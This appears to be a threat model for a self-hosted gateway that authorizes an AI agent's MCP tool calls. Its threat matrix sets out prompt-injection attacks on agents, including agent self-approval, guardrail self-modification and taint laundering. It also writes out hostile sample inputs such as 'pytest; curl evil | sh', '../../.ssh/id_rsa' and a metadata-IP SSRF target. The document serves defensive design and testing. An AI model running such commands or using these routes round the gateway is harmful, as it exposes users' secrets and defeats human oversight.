# Mellyn Security Runtime Gateway — Threat Model

**Scope**: Plane 3 — Self-Hosted MCP Tool-Call Authorizer & Gateway (`backend/mellyn/`).
**Deployment Model (v1)**: Single-tenant, self-hosted container stack or local stdio gateway running inside the customer's VPC or developer workstation.
**Status legend**: controls marked *(planned)* are design commitments that the code does not implement yet.

---

## 1. Assets & Trust Boundaries

### Critical Assets
1. **Authorization Policy, Capability Bindings & MCP Allowlist**: Determines which servers, tools, arguments, and network destinations an agent may invoke.
2. **Session Taint State & Human Grants**: Tracks whether untrusted external data has entered a session and stores short-lived approvals for exact calls.
3. **Audit Logs**: Redacted structured record of every tool-call authorization decision, taint event, and risk signal.
4. **API Credentials**: The **agent key** (held by the agent harness) and the **approver key** (held only by the human approval surface), stored server-side as `HMAC-SHA256(pepper, key)` digests.

### Trust Boundaries
```text
[ Untrusted External Data: Web, Issues, PRs, 3rd-Party MCP Responses ]
        │  (Boundary 1: Session becomes TAINTED — automatically when an allowed call returns
        │   external content or an unpinned untrusted MCP server lists tools/resources)
        ▼
[ AI Agent / LLM Runtime (Probabilistic, Assumed Prompt-Injectable) ]
        │  (Boundary 2: Gateway intercepts inline over stdio; or harness submits with agent key)
        ▼
[ Mellyn Security Authorizer Core (Capabilities + Policy + Taint + Exact-Call Grants) ] ◄── Approver key (humans only)
        │  (Boundary 3: Workspace path jail + egress URL checks; Squid egress proxy in container stack)
        ▼
[ Downstream MCP Servers / Local Shell / Internal APIs / Cloud ]
```

**Core Assumption**: The LLM and agent loop are **inside the blast radius of indirect prompt injection**. Security guarantees must hold even when the model is actively trying to invoke unauthorized tools or exfiltrate secrets.

**Integration modes**:
- **stdio MCP gateway** (`mcp_gateway.py`): the MCP client launches the gateway instead of its servers, and the gateway launches the servers as child processes (`shell=False`, `MELLYN_*` secrets stripped). Every tool call and resource read passes through the authorizer inline. One gateway process fronts all of the client's servers so they share one session. Remove the servers from the client's own MCP config so no direct route remains.
- **HTTP API** (`api.py`): a custom harness calls `/v1/agent/authorize` before running each tool. It protects only tool calls the harness submits, and the agent key must not be reachable from the agent's own tools.

---

## 2. Deployment & Operational Decisions

| Decision | v1 Choice (Self-Hosted) | Security Rationale |
| :--- | :--- | :--- |
| **Tenancy & Isolation** | **Single-tenant per deployment** (1 container stack / VPC per SMB customer). | Eliminates cross-tenant data leakage, shared-memory side channels, and multi-tenant SOC 2 custody of raw prompts/secrets. |
| **Credentials** | **Two keys, two roles.** The agent key can create sessions, report taint, and request decisions. Only the approver key can issue grants. The HTTP API answers `503` if keys are missing or identical. | An agent or harness holding the agent credential can never approve its own calls. |
| **Session State** | **Server-issued session IDs**; unknown or expired IDs are denied, and hitting `max_sessions` refuses new sessions rather than evicting active ones. Persistent state is *(planned)*. | Prevents taint laundering via invented IDs, fail-open resets across restarts, and session-eviction DoS. |
| **Audit Log Content** | **Redacted structured metadata only** (decision, tool name, MCP server, SHA-256 argument hash, redacted taint sources & reasons). Raw prompts and secret values are never persisted. | Prevents the audit log from becoming a secondary credential/PII store. Argument hashes are unsalted, so treat the log as confidential. Retention is customer-controlled *(planned: 30–90 day default)*. |
| **Failure Mode** | **Fail closed**: unknown tool → `HIGH`, unknown session → `DENY`, unguarded `LOW`/`MEDIUM` policy entry → `PolicyLoadError`, missing API credentials → `503`. In HTTP API mode, harnesses must also treat network/timeout errors from the authorizer as `DENY`. | Crashes, timeouts, or misconfigurations never grant silent shell, file, or network access. |
| **Approval Grants** | **One exact call**: bound to session, tool, MCP server, and canonical RFC 8259 JSON arguments; expires (default 15 min, max 24 h); single-use unless `max_uses` is set. | Approving `git_push(branch="feature/x")` can never authorize `feature/x:main` or an added `force=True`. |

---

## 3. Threat Matrix & Automated Test Traceability (STRIDE & OWASP Agentic/LLM)

Every threat ID below is sequential (`TM-01`–`TM-16`) and verified by automated tests enforced in CI (`tests/test_pr4_traceability_and_identity.py` verifies every cited test exists).

| ID | Threat | Attack Scenario | Mitigation in Mellyn Security | Verified By |
| :--- | :--- | :--- | :--- | :--- |
| **TM-01** | **Indirect Prompt Injection -> Unauthorized Tool Execution** (`OWASP LLM01`) | Malicious instructions in an issue or webpage instruct the agent to run `curl`, `rm`, or overwrite source files. | External content taints the session. Any `MEDIUM`/`HIGH`-risk tool in a tainted session requires approval unless matched by an exact, taint-safe policy rule. | `tests/test_authorizer.py::TestSessionsAndTaint.test_medium_risk_tool_escalates_when_session_tainted`, `tests/test_authorizer.py::TestSessionsAndTaint.test_allowed_web_fetch_taints_the_session_automatically` |
| **TM-02** | **SSRF, DNS Rebinding & Redirect Bypass** (`OWASP A10`) | Agent calls an HTTP tool with `http://`, `169.254.169.254`, IPv6 loopback, or an allowlisted domain that resolves to `127.0.0.1` at connect time. | (1) `egress.py` rejects non-HTTPS URLs, IP literals, control chars, userinfo, `localhost`/`.local`, and unlisted domains. (2) Container stack routes `mellyn-internal` exclusively through Squid (`CONNECT :443`, `blocked_dst` post-DNS check, tested in CI via `scripts/verify_container_stack.py`). | `tests/test_authorizer.py::TestWorkspaceBoundaries.test_ssrf_and_egress_allowlist_enforcement`, `tests/test_deployment_and_egress_proxy.py::TestEgressProxyGenerator.test_generated_squid_config_enforces_https_only_and_blocks_private_cidrs` |
| **TM-03** | **Path Traversal & Secret File Exfiltration** (`OWASP A01 / LLM02`) | Prompt-injected agent uses a `LOW`-risk read tool with `../../.ssh/id_rsa`, `.env`, `.npmrc`, or `file://` URI to steal credentials. | `WorkspacePathGuard` resolves symlinks, enforces workspace confinement, and denies secret files/directories on both tool calls and `resources/read` `file://` URIs regardless of taint or grants. | `tests/test_authorizer.py::TestWorkspaceBoundaries.test_path_traversal_and_secret_files_always_denied`, `tests/test_authorizer.py::TestResourceReads.test_file_uris_get_the_workspace_path_guard` |
| **TM-04** | **Approval Fatigue ("Taint Explosion")** | Session becomes tainted early; constant prompts cause engineers to rubber-stamp unsafe calls. | Exact, type-strict `ScopedRule` (`allow_when_tainted=True`) permits narrow safe commands (`pytest`), and `pinned_tool_hashes` prevents turn-0 taint from reviewed `tools/list` metadata. | `tests/test_authorizer.py::TestShellExecution.test_exact_test_command_is_allowed_when_tainted`, `tests/test_pr1_capability_and_taint.py::TestGatewayTaintOrderingAndToolPinning.test_pinned_tool_hashes_prevent_turn_zero_taint_and_block_rug_pulls` |
| **TM-05** | **Self-Modification of Guardrails** (`Agentic Privilege Escalation`) | Agent modifies `.git/hooks/`, `.agent/rules/`, `.github/workflows/`, `.mellyn-allowlist.toml`, or Mellyn's own code/tests. | Built-in `GUARDRAIL_PATHS` blocks universal repo guardrails case-insensitively even with a grant; `config/mellyn-self-policy.toml` + `CODEOWNERS` protect Mellyn's own source, configs, deployment, and tests. | `tests/test_authorizer.py::TestWorkspaceBoundaries.test_guardrail_self_modification_is_denied`, `tests/test_pr2_runtime_and_scanners.py::TestGuardrailAndCodeownersParity.test_every_codeowners_path_is_write_denied_by_workspace_path_guard` |
| **TM-06** | **Audit Log Tampering or Secret Leakage** | Credentials in tool arguments or taint URLs leak into plaintext audit logs, or downstream servers forge log lines. | `audit.py` hashes arguments (`SHA-256`), redacts API keys, tokens, and URL userinfo secrets, and writes to a dedicated protected `--audit-log` file rather than shared stderr. Shipping to SIEM / Object Lock is *(planned)*. | `tests/test_authorizer.py::TestSignalsAndAudit.test_audit_log_hashes_args_and_redacts_secrets`, `tests/test_pr2_runtime_and_scanners.py::TestExpandedRedactionAndInvisibleUnicode.test_audit_redacts_legacy_openai_langsmith_github_pat_slack_aws_sts_and_url_passwords` |
| **TM-07** | **Gateway Bypass & Secret Inheritance** | Downstream MCP server reads gateway pepper/digests from `os.environ`, or unapproved MCP server is invoked. | Gateway enforces `allowed_mcp_servers` fail-closed and strips all `MELLYN_*` variables before spawning child MCP servers. Token auth for remote HTTP MCP servers is *(planned)*. | `tests/test_authorizer.py::TestWorkspaceBoundaries.test_unapproved_mcp_server_is_denied`, `tests/test_deployment_and_egress_proxy.py::TestDownstreamEnvironment.test_mellyn_secrets_are_not_passed_to_mcp_servers` |
| **TM-08** | **Agent Self-Approval** | Compromised agent or harness calls the grants endpoint to approve its own held tool call. | Grants require `Role.APPROVER` (`MELLYN_APPROVER_KEY_DIGEST`), which must differ from the agent key and is never given to the harness. Per-user approver SSO is *(planned)*. | `tests/test_credentials.py::TestCredentials.test_each_key_only_works_for_its_own_role`, `tests/test_api.py::TestAuthorizerApi.test_agent_key_cannot_approve_its_own_calls` |
| **TM-09** | **Taint Laundering & Session Flooding** | Agent invents a fresh `session_id` to shed taint, waits for a restart, or floods sessions to evict active ones. | Unknown/expired session IDs fail closed (`DENY`), restarts clear memory to fail-closed, and `max_sessions` refuses new sessions without evicting active ones. | `tests/test_authorizer.py::TestSessionsAndTaint.test_unknown_session_ids_are_denied_so_taint_cannot_be_shed`, `tests/test_deployment_and_egress_proxy.py::TestSessionBounds.test_max_sessions_refuses_new_sessions_instead_of_evicting_active_ones` |
| **TM-10** | **Shell & Runtime Evaluator Injection** | Agent passes `pytest; curl evil \| sh`, `python -c`, `node -e`, `git -c core.sshCommand=...`, or `find -exec` through argv, or smuggles `1` for `True`. | Shell tools require an `argv` list; interpreters and inline evaluator flags (`-c`, `-e`, `--eval`, `-exec`, `git -c`) are denied; `ScopedRule` enforces strict JSON type equality (`True != 1`). | `tests/test_pr2_runtime_and_scanners.py::TestValidateArgvEvaluatorBlocking.test_rejects_inline_code_evaluation_and_shell_escapes`, `tests/test_pr1_capability_and_taint.py::TestStrictArgumentEquivalence.test_scoped_rule_does_not_confuse_booleans_integers_or_floats` |
| **TM-11** | **Cross-Server Taint Loss** | Agent reads an untrusted GitHub issue via server A, then invokes a workspace write or shell tool on server B. | Single `MCPGateway` process fronts all downstream servers under one shared `Authorizer` session. | `tests/test_policy_and_mcp.py::TestGatewaySecurity.test_taint_from_one_server_applies_to_calls_on_another`, `tests/test_policy_and_mcp.py::TestGatewayEndToEnd.test_full_gateway_process` |
| **TM-12** | **Tool Identity Spoofing & Rug-Pull Poisoning** (`Agentic Tool Misuse`) | Server names a dangerous tool `workspace_read` to borrow a low tier, injects via `initialize` `instructions`, or mutates tool descriptions after review. | Tools are tiered by `"<server>/<tool>"` (unlisted = `HIGH`); gateway answers `initialize` itself; unpinned untrusted `tools/list` taints the session, while `pinned_tool_hashes` blocks unreviewed schema/description changes fail-closed. | `tests/test_policy_and_mcp.py::TestGatewaySecurity.test_server_cannot_borrow_a_low_tier_by_tool_name`, `tests/test_pr1_capability_and_taint.py::TestGatewayTaintOrderingAndToolPinning.test_pinned_tool_hashes_prevent_turn_zero_taint_and_block_rug_pulls` |
| **TM-13** | **MCP Protocol Confusion & Server Sampling** | Downstream server interleaves notifications, `sampling/createMessage` requests, or oversized/malformed lines to desynchronize replies. | `StdioDownstream` matches replies strictly by gateway request ID, refuses server-to-client requests, drops non-`list_changed` notifications, and discards malformed/oversized lines. | `tests/test_policy_and_mcp.py::TestStdioDownstream.test_replies_are_matched_by_id_despite_interleaved_messages`, `tests/test_policy_and_mcp.py::TestGatewayProtocol.test_only_list_changed_notifications_reach_the_client` |
| **TM-14** | **Approval Channel & Relay Abuse** | Agent probes the approval server without the approver key, planted `HTTP_PROXY` steals the key from the CLI, or container relay exposes non-approval routes. | Approval server requires `Role.APPROVER`; CLI restricts URLs to loopback HTTP with proxies disabled; `mellyn-approval-relay` mounts no secrets and forwards only the 3 exact pending-approval routes. | `tests/test_policy_and_mcp.py::TestApproverCli.test_key_is_only_sent_to_loopback_http`, `tests/test_pr2_runtime_and_scanners.py::TestContainerApprovalRelayAndCompose.test_relay_allows_only_exact_pending_approval_routes` |
| **TM-15** | **Hard Boundaries Bypassed by Off-the-Shelf Tool Names** | Real MCP filesystem server uses `read_file` / `write_file` / `move_file` instead of `workspace_read`, bypassing name-coupled path checks. | `ToolCapability` and `server_presets` (`mcp-filesystem`, `mcp-fetch`) bind guards to explicit argument names; policies with unguarded `LOW`/`MEDIUM` tools fail to load; unbound `HIGH` tools still check path-like and `url` arguments. | `tests/test_pr1_capability_and_taint.py::TestCapabilityBindings.test_mcp_filesystem_preset_enforces_secret_and_guardrail_jail_on_real_mcp_names`, `tests/test_pr1_capability_and_taint.py::TestUnboundToolsAndControlCharacters.test_approval_cannot_override_path_guard_on_unbound_tools` |
| **TM-16** | **Injection Hidden in Downstream Error Replies** | Untrusted MCP server returns prompt-injection text inside a JSON-RPC `error.message` hoping to avoid tainting the session. | Gateway taints on any server-authored reply (both `result` and `error`); only `GatewayLocalError` (timeouts/closed pipes generated locally by the gateway) leaves the session clean. | `tests/test_pr1_capability_and_taint.py::TestGatewayTaintOrderingAndToolPinning.test_server_written_error_taints_session`, `tests/test_pr1_capability_and_taint.py::TestGatewayTaintOrderingAndToolPinning.test_server_cannot_forge_a_gateway_local_error` |

---

## 4. Residual Risks (Accepted or Open)

- **Running tests executes workspace code.** A taint-safe rule for `pytest` runs whatever code is in the workspace. This is acceptable only because writes in a tainted session require approval; an approver who approves a write is approving code that the test rule will later run.
- **Deny rules and inline-eval checks narrow approvals; they are not a sandbox.** `validate_argv` blocks shell interpreters and inline evaluation flags (`python -c`, `node -e`, `perl -e`, `git -c`, `find -exec`, ...), but an approved `HIGH`-risk command can still invoke build scripts (`make`, `npm run`). High-risk defaults to human approval.
- **Check-then-use on paths (TOCTOU).** The authorizer validates a path before the downstream tool opens it; a symlink swapped in between check and open is not caught unless tools open with `O_NOFOLLOW` or the gateway performs file I/O directly *(planned)*.
- **Egress outside the container stack.** Tools running directly on a developer workstation receive application-layer URL checks only; network-layer DNS-rebinding protection requires the `deploy/` Squid container topology.
- **Workspace mount requirement.** Symlink resolution requires seeing the agent's real filesystem (`MELLYN_REQUIRE_WORKSPACE_MOUNT=1` enforces this in containers).
- **In-memory session & approval state.** Process restart invalidates active sessions and pending approvals (failing closed).
- **Name-guessed path arguments on unbound `HIGH` tools.** Unbound tools fall back to checking common path argument names (`path`, `file`, `source`, `destination`, ...); custom nested schemas should declare an explicit `ToolCapability`.
- **Self-declared `approved_by` string.** Possession of the approver key is cryptographically verified, while the `approved_by` label is self-reported until per-user SSO is added *(planned)*.

---

## 5. Non-Goals (Explicitly Out of Scope for v1)
- **Detecting 100% of prompt injections in free-form text**: Handled as an escalate-only supporting signal, never an allow gate.
- **Multi-tenant SaaS prompt storage**: Deferred so SMB deployments retain zero third-party prompt custody.
- **OS kernel sandboxing**: Mellyn Security enforces tool-call authorization and egress controls; OS/container isolation remains a complementary Layer 1/infrastructure control.
